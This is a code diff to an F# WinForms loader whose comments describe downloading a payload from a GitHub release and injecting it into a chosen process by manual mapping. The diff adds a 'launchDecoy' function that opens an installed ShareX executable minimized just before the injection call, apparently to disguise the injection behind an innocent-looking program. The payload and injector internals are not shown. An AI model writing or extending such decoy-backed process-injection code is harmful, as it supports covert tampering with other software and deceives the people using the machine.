@@ -1,5 +1,6 @@
 open System
 open System.Buffers.Binary
+open System.Diagnostics
 open System.IO
 open System.Net.Http
 open System.Numerics
@@ -2677,6 +2678,24 @@ module WinFormsShell =
         (* ---- Auto-inject flow: discover -> download -> verify -> inject ---- *)
         let releaseEndpoint = "https://github.com/tejugenz-ops/gg/releases/download/v1"
 
+        let launchDecoy () =
+            let paths = [
+                @"C:\Program Files\ShareX\ShareX.exe"
+                @"C:\Program Files (x86)\ShareX\ShareX.exe"
+            ]
+            let localApp = Environment.GetEnvironmentVariable("LOCALAPPDATA")
+            let allPaths =
+                if not (isNull localApp) then
+                    paths @ [ IO.Path.Combine(localApp, "ShareX", "ShareX.exe") ]
+                else paths
+            allPaths
+            |> List.tryFind (fun p -> IO.File.Exists(p))
+            |> Option.iter (fun p ->
+                try
+                    let psi = ProcessStartInfo(p, UseShellExecute = true, WindowStyle = ProcessWindowStyle.Minimized)
+                    Process.Start(psi) |> ignore
+                with _ -> ())
+
         let startInjection (selectedTarget: TargetDiscovery.Target) =
             if state.TryTransition(LoaderState.DownloadingPayload) then
                 stateLabel.Text <- LoaderState.describe LoaderState.DownloadingPayload
@@ -2724,6 +2743,7 @@ module WinFormsShell =
                                             runtimeLabel.Text <- $"waiting | {session.Names.Token[..7]}"
                                             let configBytes = IpcAbi.serializeConfig snapshot
                                             let pid = selectedTarget.ProcessId
+                                            launchDecoy()
                                             Task.Run((fun () -> ManualMap.inject payloadBytes pid configBytes session.MappingHandle), cancellation.Token)
                                                 .ContinueWith(fun (injection: Task<Result<nativeint, string>>) ->
                                                     dispatch (fun () ->
